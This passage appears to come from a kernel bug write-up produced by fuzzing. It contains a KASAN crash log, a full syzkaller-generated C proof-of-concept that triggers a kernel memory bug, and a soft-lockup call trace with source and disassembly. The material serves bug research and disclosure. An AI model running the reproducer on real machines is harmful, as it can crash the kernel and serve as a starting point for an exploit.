[  164.055513]  ffff88005a987780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  164.056689]  ffff88005a987800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  164.058088] >ffff88005a987880: 00 00 00 00 00 00 00 00 cb cb cb cb 00 00 00 00
[  164.059202]                                            ^
[  164.060069]  ffff88005a987900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  164.061549]  ffff88005a987980: 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00
[  164.062649] ==================================================================
[  164.063841] Disabling lock debugging due to kernel taint

Message from syslogd@zer0day at Mar  3 16:44:33 ...
 kernel:[  164.048763] page:ffffea00016a61c0 count:0 mapcount:0 mapping:0000000000000000 index:0x0

Message from syslogd@zer0day at Mar  3 16:44:33 ...
 kernel:[  164.050054] flags: 0x100000000000000()
```

### PoC

Here's reproducible PoC code generated by syzkaller.

```c
#define _GNU_SOURCE 

#include <endian.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <sys/mount.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_tun.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <net/if_arp.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <linux/net.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

__attribute__((noreturn)) static void doexit(int status)
{
	volatile unsigned i;
	syscall(__NR_exit_group, status);
	for (i = 0;; i++) {
	}
}

#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

const int kFailStatus = 67;
const int kRetryStatus = 69;

static void fail(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);
}

static void exitf(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit(kRetryStatus);
}

static uint64_t current_time_ms()
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts))
		fail("clock_gettime failed");
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void use_temporary_dir()
{
	char tmpdir_template[] = "./syzkaller.XXXXXX";
	char* tmpdir = mkdtemp(tmpdir_template);
	if (!tmpdir)
		fail("failed to mkdtemp");
	if (chmod(tmpdir, 0777))
		fail("failed to chmod");
	if (chdir(tmpdir))
		fail("failed to chdir");
}

static void vsnprintf_check(char* str, size_t size, const char* format, va_list args)
{
	int rv;

	rv = vsnprintf(str, size, format, args);
	if (rv < 0)
		fail("tun: snprintf failed");
	if ((size_t)rv >= size)
		fail("tun: string '%s...' doesn't fit into buffer", str);
}

static void snprintf_check(char* str, size_t size, const char* format, ...)
{
	va_list args;

	va_start(args, format);
	vsnprintf_check(str, size, format, args);
	va_end(args);
}

#define COMMAND_MAX_LEN 128
#define PATH_PREFIX "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin "
#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)

static void execute_command(bool panic, const char* format, ...)
{
	va_list args;
	char command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];
	int rv;

	va_start(args, format);
	memcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);
	vsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);
	rv = system(command);
	if (panic && rv != 0)
		fail("tun: command \"%s\" failed with code %d", &command[0], rv);

	va_end(args);
}

static int tunfd = -1;
static int tun_frags_enabled;

#define SYZ_TUN_MAX_PACKET_SIZE 1000

#define TUN_IFACE "syz_tun"

#define LOCAL_MAC "aa:aa:aa:aa:aa:aa"
#define REMOTE_MAC "aa:aa:aa:aa:aa:bb"

#define LOCAL_IPV4 "172.20.20.170"
#define REMOTE_IPV4 "172.20.20.187"

#define LOCAL_IPV6 "fe80::aa"
#define REMOTE_IPV6 "fe80::bb"

#define IFF_NAPI 0x0010
#define IFF_NAPI_FRAGS 0x0020

static void initialize_tun(void)
{
	tunfd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
	if (tunfd == -1) {
		printf("tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\n");
		printf("otherwise fuzzing or reproducing might not work as intended\n");
		return;
	}
	const int kTunFd = 252;
	if (dup2(tunfd, kTunFd) < 0)
		fail("dup2(tunfd, kTunFd) failed");
	close(tunfd);
	tunfd = kTunFd;

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;
	if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {
		ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
		if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)
			fail("tun: ioctl(TUNSETIFF) failed");
	}
	if (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)
		fail("tun: ioctl(TUNGETIFF) failed");
	tun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;

	execute_command(1, "sysctl -w net.ipv6.conf.%s.accept_dad=0", TUN_IFACE);

	execute_command(1, "sysctl -w net.ipv6.conf.%s.router_solicitations=0", TUN_IFACE);

	execute_command(1, "ip link set dev %s address %s", TUN_IFACE, LOCAL_MAC);
	execute_command(1, "ip addr add %s/24 dev %s", LOCAL_IPV4, TUN_IFACE);
	execute_command(1, "ip -6 addr add %s/120 dev %s", LOCAL_IPV6, TUN_IFACE);
	execute_command(1, "ip neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV4, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip -6 neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV6, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip link set dev %s up", TUN_IFACE);
}

#define DEV_IPV4 "172.20.20.%d"
#define DEV_IPV6 "fe80::%02hx"
#define DEV_MAC "aa:aa:aa:aa:aa:%02hx"

static void initialize_netdevices(void)
{
	unsigned i;
	const char* devtypes[] = {"ip6gretap", "bridge", "vcan", "bond", "veth"};
	const char* devnames[] = {"lo", "sit0", "bridge0", "vcan0", "tunl0",
				  "gre0", "gretap0", "ip_vti0", "ip6_vti0",
				  "ip6tnl0", "ip6gre0", "ip6gretap0",
				  "erspan0", "bond0", "veth0", "veth1"};

	for (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)
		execute_command(0, "ip link add dev %s0 type %s", devtypes[i], devtypes[i]);
	execute_command(0, "ip link add dev veth1 type veth");
	for (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {
		char addr[32];
		snprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);
		execute_command(0, "ip -4 addr add %s/24 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);
		execute_command(0, "ip -6 addr add %s/120 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);
		execute_command(0, "ip link set dev %s address %s", devnames[i], addr);
		execute_command(0, "ip link set dev %s up", devnames[i]);
	}
}

static int read_tun(char* data, int size)
{
	if (tunfd < 0)
		return -1;

	int rv = read(tunfd, data, size);
	if (rv < 0) {
		if (errno == EAGAIN)
			return -1;
		if (errno == EBADFD)
			return -1;
		fail("tun: read failed with %d", rv);
	}
	return rv;
}

static void flush_tun()
{
	char data[SYZ_TUN_MAX_PACKET_SIZE];
	while (read_tun(&data[0], sizeof(data)) != -1)
		;
}

static uintptr_t syz_open_pts(uintptr_t a0, uintptr_t a1)
{
	int ptyno = 0;
	if (ioctl(a0, TIOCGPTN, &ptyno))
		return -1;
	char buf[128];
	sprintf(buf, "/dev/pts/%d", ptyno);
	return open(buf, a1, 0);
}

#define XT_TABLE_SIZE 1536
#define XT_MAX_ENTRIES 10

struct xt_counters {
	uint64_t pcnt, bcnt;
};

struct ipt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_entries;
	unsigned int size;
};

struct ipt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct ipt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct ipt_table_desc {
	const char* name;
	struct ipt_getinfo info;
	struct ipt_replace replace;
};

static struct ipt_table_desc ipv4_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

static struct ipt_table_desc ipv6_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

#define IPT_BASE_CTL 64
#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)
#define IPT_SO_GET_INFO (IPT_BASE_CTL)
#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)

struct arpt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_entries;
	unsigned int size;
};

struct arpt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct arpt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct arpt_table_desc {
	const char* name;
	struct arpt_getinfo info;
	struct arpt_replace replace;
};

static struct arpt_table_desc arpt_tables[] = {
    {.name = "filter"},
};

#define ARPT_BASE_CTL 96
#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)
#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)
#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)

static void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct ipt_get_entries entries;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(IPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(IPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct ipt_get_entries entries;
	struct ipt_getinfo info;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(IPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(IPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(IPT_SO_SET_REPLACE)");
	}
	close(fd);
}

static void checkpoint_arptables(void)
{
	struct arpt_get_entries entries;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(ARPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(ARPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_arptables()
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct arpt_get_entries entries;
	struct arpt_getinfo info;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(ARPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(ARPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(ARPT_SO_SET_REPLACE)");
	}
	close(fd);
}
#include <linux/if.h>
#include <linux/netfilter_bridge/ebtables.h>

struct ebt_table_desc {
	const char* name;
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
};

static struct ebt_table_desc ebt_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "broute"},
};

static void checkpoint_ebtables(void)
{
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(EBT_SO_GET_INIT_INFO)");
		}
		if (table->replace.entries_size > sizeof(table->entrytable))
			fail("table size is too large: %u", table->replace.entries_size);
		table->replace.num_counters = 0;
		table->replace.entries = table->entrytable;
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INIT_ENTRIES)");
	}
	close(fd);
}

static void reset_ebtables()
{
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
	socklen_t optlen;
	unsigned i, j, h;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		if (table->replace.valid_hooks == 0)
			continue;
		memset(&replace, 0, sizeof(replace));
		strcpy(replace.name, table->name);
		optlen = sizeof(replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INFO)");
		replace.num_counters = 0;
		for (h = 0; h < NF_BR_NUMHOOKS; h++)
			table->replace.hook_entry[h] = 0;
		if (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {
			memset(&entrytable, 0, sizeof(entrytable));
			replace.entries = entrytable;
			optlen = sizeof(replace) + replace.entries_size;
			if (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))
				fail("getsockopt(EBT_SO_GET_ENTRIES)");
			if (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)
				continue;
		}
		for (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {
			if (table->replace.valid_hooks & (1 << h)) {
				table->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;
				j++;
			}
		}
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))
			fail("setsockopt(EBT_SO_SET_ENTRIES)");
	}
	close(fd);
}

static void checkpoint_net_namespace(void)
{
	checkpoint_ebtables();
	checkpoint_arptables();
	checkpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	checkpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void reset_net_namespace(void)
{
	reset_ebtables();
	reset_arptables();
	reset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	reset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void remove_dir(const char* dir)
{
	DIR* dp;
	struct dirent* ep;
	int iter = 0;
retry:
	dp = opendir(dir);
	if (dp == NULL) {
		if (errno == EMFILE) {
			exitf("opendir(%s) failed due to NOFILE, exiting", dir);
		}
		exitf("opendir(%s) failed", dir);
	}
	while ((ep = readdir(dp))) {
		if (strcmp(ep->d_name, ".") == 0 || strcmp(ep->d_name, "..") == 0)
			continue;
		char filename[FILENAME_MAX];
		snprintf(filename, sizeof(filename), "%s/%s", dir, ep->d_name);
		struct stat st;
		if (lstat(filename, &st))
			exitf("lstat(%s) failed", filename);
		if (S_ISDIR(st.st_mode)) {
			remove_dir(filename);
			continue;
		}
		int i;
		for (i = 0;; i++) {
			if (unlink(filename) == 0)
				break;
			if (errno == EROFS) {
				break;
			}
			if (errno != EBUSY || i > 100)
				exitf("unlink(%s) failed", filename);
			if (umount2(filename, MNT_DETACH))
				exitf("umount(%s) failed", filename);
		}
	}
	closedir(dp);
	int i;
	for (i = 0;; i++) {
		if (rmdir(dir) == 0)
			break;
		if (i < 100) {
			if (errno == EROFS) {
				break;
			}
			if (errno == EBUSY) {
				if (umount2(dir, MNT_DETACH))
					exitf("umount(%s) failed", dir);
				continue;
			}
			if (errno == ENOTEMPTY) {
				if (iter < 100) {
					iter++;
					goto retry;
				}
			}
		}
		exitf("rmdir(%s) failed", dir);
	}
}

static void test();

void loop() {
	int iter;
	checkpoint_net_namespace();
	for (iter = 0;; iter++) {
		char cwdbuf[256];
		sprintf(cwdbuf, "./%d", iter);
		if (mkdir(cwdbuf, 0777))
			fail("failed to mkdir");
		int pid = fork();
		if (pid < 0)
			fail("loop fork failed");
		if (pid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
			setpgrp();
			if (chdir(cwdbuf))
				fail("failed to chdir");
			flush_tun();
			test();
			doexit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			int res = waitpid(-1, &status, __WALL | WNOHANG);
			if (res == pid)
				break;
			usleep(1000);
			if (current_time_ms() - start > 5 * 1000) {
				kill(-pid, SIGKILL);
				kill(pid, SIGKILL);
				while (waitpid(-1, &status, __WALL) != pid) {
				}
				break;
			}
		}
		remove_dir(cwdbuf);
		reset_net_namespace();
	}
}

uint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};
void test()
{
	long res;memcpy((void*)0x20000280, "/dev/loop-control", 18);
	syscall(__NR_openat, 0xffffffffffffff9c, 0x20000280, 0x4000, 0);
	*(uint64_t*)0x20000180 = 0;
	*(uint64_t*)0x20000188 = 0;
	*(uint64_t*)0x20000190 = 0;
	*(uint64_t*)0x20000198 = 0;
	syscall(__NR_timer_settime, 0, 0, 0x20000180, 0);
	*(uint64_t*)0x20000500 = 0x77359400;
	*(uint64_t*)0x20000508 = 0;
	*(uint64_t*)0x20000510 = 0;
	*(uint64_t*)0x20000518 = 0x989680;
	syscall(__NR_timer_settime, 0, 0, 0x20000500, 0x20000540);
	res = syz_open_pts(-1, 0x42100);
	if (res != -1)
		r[0] = res;
	syscall(__NR_ioctl, r[0], 0x5462, 0x20000140);
	syscall(__NR_ioctl, r[0], 0x80084504, 0x200002c0);
	res = syscall(__NR_pipe2, 0x20000000, 0);
	if (res != -1) {
		r[1] = *(uint32_t*)0x20000000;
		r[2] = *(uint32_t*)0x20000004;
	}
	*(uint16_t*)0x20000040 = -1;
	*(uint16_t*)0x20000042 = 0x200;
	*(uint16_t*)0x20000044 = 0x8000;
	*(uint16_t*)0x20000046 = 0x3f;
	*(uint16_t*)0x20000048 = 0x22;
	*(uint16_t*)0x2000004a = 0x45f;
	syscall(__NR_ioctl, r[1], 0x560a, 0x20000040);
	syscall(__NR_fstatfs, r[1], 0x200000c0);
	syz_open_pts(r[2], 0);
	*(uint32_t*)0x20000340 = 0x10;
	syscall(__NR_accept, r[2], 0x20000300, 0x20000340);
	syscall(__NR_fcntl, r[2], 4, 0x40400);
}

int main()
{
	syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
	char *cwd = get_current_dir_name();
	for (;;) {
		if (chdir(cwd))
			fail("failed to chdir");
		use_temporary_dir();
		initialize_tun();
		initialize_netdevices();
		loop();
	}
}
```

## default_idle - soft lockup

It just halted during booting.

### Call Trace (Dump)

```c
watchdog: BUG: soft lockup - CPU#0 stuck for 153s! [swapper/0:0]
Modules linked in:
irq event stamp: 5914346
hardirqs last  enabled at (5914343): [<0000000098680cd3>] default_idle+0x18/0x2c0 arch/x86/kernel/process.c:354
hardirqs last disabled at (5914344): [<00000000d4f96a97>] interrupt_entry+0xc0/0xe0 arch/x86/entry/entry_64.S:619
softirqs last  enabled at (5914346): [<000000000af1e516>] irq_enter+0xb6/0xd0 kernel/softirq.c:347
softirqs last disabled at (5914345): [<00000000b393087c>] irq_enter+0x9b/0xd0 kernel/softirq.c:351
CPU: 0 PID: 0 Comm: swapper/0 Not tainted 4.16.0-rc3+ #4
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
RIP: 0010:native_safe_halt+0x2/0x10 arch/x86/include/asm/irqflags.h:54
RSP: 0018:ffffffffa3607d88 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff12
RAX: 0000000000000007 RBX: dffffc0000000000 RCX: 0000000000000000
RDX: 0000000000000000 RSI: 0000000000000001 RDI: ffffffffa362bdec
RBP: 0000000000000000 R08: ffffffffa362b580 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000000 R12: ffffffffa3cb8ba0
R13: 0000000000000000 R14: 0000000000000000 R15: ffffffffa3cb8c40
FS:  0000000000000000(0000) GS:ffff88002e000000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000619570 CR3: 000000002a01e000 CR4: 00000000000006f0
DR0: 0000000020000100 DR1: 0000000020000100 DR2: 0000000020000100
DR3: 0000000020000100 DR6: 00000000fffe0ff0 DR7: 0000000000000600
Call Trace:
 arch_safe_halt arch/x86/include/asm/paravirt.h:94 [inline]
 default_idle+0x1d/0x2c0 arch/x86/kernel/process.c:354
 cpuidle_idle_call kernel/sched/idle.c:156 [inline]
 do_idle+0x233/0x2c0 kernel/sched/idle.c:246
 cpu_startup_entry+0xc6/0xd0 kernel/sched/idle.c:351
 start_kernel+0x840/0x880 init/main.c:717
 secondary_startup_64+0xa5/0xb0 arch/x86/kernel/head_64.S:239
Code: 04 24 e8 12 ee ed fd 48 8b 04 24 e9 d6 fe ff ff 48 89 df e8 01 ee ed fd eb 8a 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 fb f4 <c3> 0f 1f 00 66 2e 0f 1f 84 00 00 00 00 00 f4 c3 90 90 90 90 90 
```

### Source Code

Here's ```default_idle()``` ```/arch/x86/kernel/process.c``` in *v4.16.0-rc3*.

```c
void __cpuidle default_idle(void)
{
	trace_cpu_idle_rcuidle(1, smp_processor_id());
	safe_halt();
	trace_cpu_idle_rcuidle(PWR_EVENT_EXIT, smp_processor_id());
}
```

And this is disassemble of compiled ```vmlinux``` with my ```.config```.

```c
gdb-peda$ pdisas default_idle
Dump of assembler code for function default_idle:
   0xffffffff821acb10 <+0>:	    push   r12
   0xffffffff821acb12 <+2>:	    push   rbp
   0xffffffff821acb13 <+3>:	    push   rbx
   0xffffffff821acb14 <+4>:	    mov    ebp,DWORD PTR gs:[rip+0x7de62615]        # 0xf130 <cpu_number>
   0xffffffff821acb1b <+11>:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff821acb20 <+16>:	call   0xffffffff810f2370 <trace_hardirqs_on>
   0xffffffff821acb25 <+21>:	call   QWORD PTR ds:0xffffffff82c406c0
   0xffffffff821acb2c <+28>:	mov    ebp,DWORD PTR gs:[rip+0x7de625fd]        # 0xf130 <cpu_number>
   0xffffffff821acb33 <+35>:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff821acb38 <+40>:	pop    rbx
   0xffffffff821acb39 <+41>:	pop    rbp
   0xffffffff821acb3a <+42>:	pop    r12
   0xffffffff821acb3c <+44>:	ret    
   0xffffffff821acb3d <+45>:	mov    eax,DWORD PTR gs:[rip+0x7de625ec]        # 0xf130 <cpu_number>
   0xffffffff821acb44 <+52>:	mov    eax,eax
   0xffffffff821acb46 <+54>:	bt     QWORD PTR [rip+0xbf8b52],rax        # 0xffffffff82da56a0 <__cpu_online_mask>
   0xffffffff821acb4e <+62>:	jae    0xffffffff821acb38 <default_idle+40>
   0xffffffff821acb50 <+64>:	call   0xffffffff8112fef0 <rcu_irq_enter_irqson>
   0xffffffff821acb55 <+69>:	inc    DWORD PTR gs:[rip+0x7de682b4]        # 0x14e10 <__preempt_count>
   0xffffffff821acb5c <+76>:	mov    rbx,QWORD PTR [rip+0xbad0a5]        # 0xffffffff82d59c08 <__tracepoint_cpu_idle+40>
